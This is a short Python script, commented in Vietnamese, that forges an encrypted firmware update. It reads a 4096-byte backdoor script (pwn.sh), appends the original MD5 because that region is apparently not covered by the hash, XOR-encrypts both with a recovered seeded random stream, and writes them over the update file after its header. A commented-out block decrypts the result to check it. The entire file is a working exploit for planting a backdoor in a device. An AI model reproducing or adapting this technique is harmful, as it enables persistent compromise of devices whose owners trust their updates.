# Mở file update đã được mã hoá
f = open('28.00.00.30-b.bin.enc', 'rb').read()

print(len(f))

# Đọc vào dãy số random đã được generate từ seed
rands = list(map(int, open('rand.txt', 'r').read().strip().split('\n')))


def chunks_(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]


def reformatInt64(arr):
    res = 0

    arr = list(arr)[::-1]

    for item in arr:
        res <<= 8
        res |= item

    return res


def int64ToBytes(num):
    res = []

    while num:
        res.append(num & ((1 << 8) - 1))
        num >>= 8

    return res + [0] * (8 - len(res))


# Đọc code backdoor
bootupdater = open('pwn.sh', 'rb').read()
# Padding cho đủ 4096 bytes
bootupdater += b'\0' * (4096 - len(bootupdater))

# Đọc md5 hash, vì phần backdoor của chúng ta không được hash nên hash này không thay đổi, chỉ cần dùng hash có sẵn từ file update được cắt ra trước đó
md5 = open('payload.md5', 'rb').read()

raw = bootupdater + md5

print(len(raw))

# Chia thành các chunk 8 bytes
chunks = chunks_(raw, 8)
# Convert mỗi chunk 8 bytes thành 1 số int 64 bit
ints = list(map(reformatInt64, chunks))

arr = []

# xor từng block 64 bit với số random tương ứng
for i in range(4096 * 2 // 8):
    xorred = ints[i] ^ rands[i]
    arr += int64ToBytes(xorred)

f = list(f)

# Skip qua 100 bytes header ở đầu, override phần còn lại
for i in range(len(arr)):
    f[i + 100] = arr[i]

# Ghi file đã được override
open('upg.bin.enc', 'wb').write(bytes(f))

# Thử decrypt lại để kiểm tra
'''
f1 = open('28.00.00.30-b.bin.enc', 'rb').read()[100:]

chunks1 = chunks_(f1, 8)
ints1 = list(map(reformatInt64, chunks1))

arr1 = []

for i in range(len(ints1)):
    xorred = ints1[i] ^ rands[i]
    arr1 += int64ToBytes(xorred)

open('test.txt', 'wb').write(bytes(arr1))
'''
